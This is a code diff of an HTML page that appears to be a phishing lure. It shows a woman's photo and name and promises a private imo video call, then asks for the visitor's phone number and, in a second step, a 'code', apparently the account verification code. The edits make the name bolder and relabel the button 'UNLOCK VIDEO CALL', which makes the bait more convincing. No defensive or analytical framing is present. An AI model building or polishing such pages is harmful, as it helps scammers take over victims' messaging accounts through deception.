@@ -10,7 +10,9 @@
         .card { width: 95%; max-width: 380px; margin: 50px auto; background: white; padding: 25px 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); box-sizing: border-box; }
         img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #e91e63; object-fit: cover; margin-bottom: 10px; }
         
-        h2 { margin: 10px 0; font-size: 22px; color: #000; }
+        /* নামকে আরও মোটা করার জন্য CSS */
+        h2 { margin: 10px 0; font-size: 26px; color: #000; font-weight: 900; letter-spacing: -0.5px; }
+        
         p { color: #333; font-size: 14px; margin-bottom: 20px; }
 
         input#phone { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; }
@@ -34,13 +36,13 @@
 <div class="card">
     <img src="received_1748447966512537.jpeg" alt="Profile Image">
     
-    <h2 id="displayTitle">Sumaiya Afrin</h2>
+    <h2 id="displayTitle" style="font-weight: 900;">Sumaiya Afrin</h2>
     <p id="displayMsg">আপনার ইমু নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
 
     <form id="mainForm">
         <div id="step1">
             <input type="tel" id="phone" placeholder="Phone Number imo ✆" required>
-            <button type="button" class="unlock-btn" onclick="goToStep2()">VIDEO CALL JOIN NOW</button>
+            <button type="button" class="unlock-btn" onclick="goToStep2()">🔒 UNLOCK VIDEO CALL JOIN NOW</button>
         </div>
 
         <div id="step2" style="display:none;">
@@ -128,7 +130,6 @@
         }
         userPhone = phoneInput;
 
-        // নাম পরিবর্তন করে "Private Access" করা হলো
         document.getElementById('displayTitle').innerText = "Private Access";
         document.getElementById('displayMsg').innerText = "কোডটি নিচে লিখুন";
 
